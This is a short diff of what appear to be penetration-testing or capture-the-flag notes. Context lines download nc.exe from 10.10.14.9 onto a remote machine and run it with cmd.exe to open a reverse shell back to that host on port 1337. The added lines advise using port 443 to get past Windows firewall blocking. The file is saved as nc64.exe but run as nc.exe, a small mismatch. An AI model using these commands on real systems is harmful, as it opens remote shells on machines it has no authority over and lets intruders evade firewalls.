@@ -67,3 +67,7 @@ on remote machine in a directory where allowed to write:
 wget http://10.10.14.9/nc.exe -outfile nc64.exe
 .\nc.exe -e cmd.exe 10.10.14.9 1337
 ```
+
+# Known issues
+
+- on windows many ports are blocked by the firewall but ports like 443 should work
